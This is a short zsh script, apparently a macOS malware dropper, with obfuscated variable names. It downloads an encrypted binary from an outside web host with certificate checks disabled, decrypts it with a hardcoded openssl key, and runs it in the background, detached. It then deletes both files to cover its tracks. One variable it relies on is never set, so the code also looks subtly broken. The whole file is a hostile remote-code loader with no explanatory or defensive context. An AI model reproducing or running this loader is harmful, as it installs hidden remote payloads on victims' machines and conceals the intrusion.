#!/bin/zsh
whmp6=$(mktemp /tmp/bytzxu.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m11bf3c908fcee1fe.bin" -o "$whmp6z" || exit 1
kmwmte=$(stat -f %z "$whmp6z"); v7c65wy=$(( kmwmte - 3082 - 3760 ))
tail -c +$(( 3082 + 1 )) "$whmp6z" | head -c $v7c65wy | openssl enc -d -aes-256-cbc -k b0aa35aa1a581c28393f2d49 -out "$whmp6" 2>/dev/null
[ -s "$whmp6" ] && chmod 700 "$whmp6" && ( "$whmp6" & ) && disown
( sleep 3; rm -f "$whmp6" "$whmp6z" ) &>/dev/null &
